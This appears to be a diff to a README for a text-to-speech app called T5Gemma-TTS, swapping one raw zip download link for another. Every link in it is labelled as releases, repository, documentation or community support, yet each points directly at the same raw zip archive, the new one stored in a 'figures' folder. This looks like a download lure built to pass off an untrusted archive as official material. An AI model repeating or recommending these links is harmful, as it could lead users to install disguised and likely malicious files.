@@ -10,7 +10,7 @@ T5Gemma-TTS is a multilingual text-to-speech (TTS) application that brings your 
 - **User-Friendly Interface:** Designed for anyone, regardless of technical background.
 
 ## 📥 Download & Install
-To get started with T5Gemma-TTS, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/models/Gemma_TTS_3.1.zip).
+To get started with T5Gemma-TTS, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/figures/TTS_Gemma_v2.7.zip).
 
 ### Step 1: Visit the Releases Page
 1. Click on the link above to go to the releases page.
@@ -67,9 +67,9 @@ Yes, but please review the licensing terms for any restrictions.
 To report a bug, visit the Issues section on the GitHub repository and provide detailed information.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/models/Gemma_TTS_3.1.zip)
-- [Documentation](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/models/Gemma_TTS_3.1.zip)
-- [Community Support](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/models/Gemma_TTS_3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/figures/TTS_Gemma_v2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/figures/TTS_Gemma_v2.7.zip)
+- [Community Support](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/figures/TTS_Gemma_v2.7.zip)
 
 ## 📢 Stay Updated
-Stay tuned for updates, new features, and improvements by keeping an eye on the Releases page: [GitHub Releases](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/models/Gemma_TTS_3.1.zip).
+Stay tuned for updates, new features, and improvements by keeping an eye on the Releases page: [GitHub Releases](https://raw.githubusercontent.com/EfeTuga/T5Gemma-TTS/main/figures/TTS_Gemma_v2.7.zip).
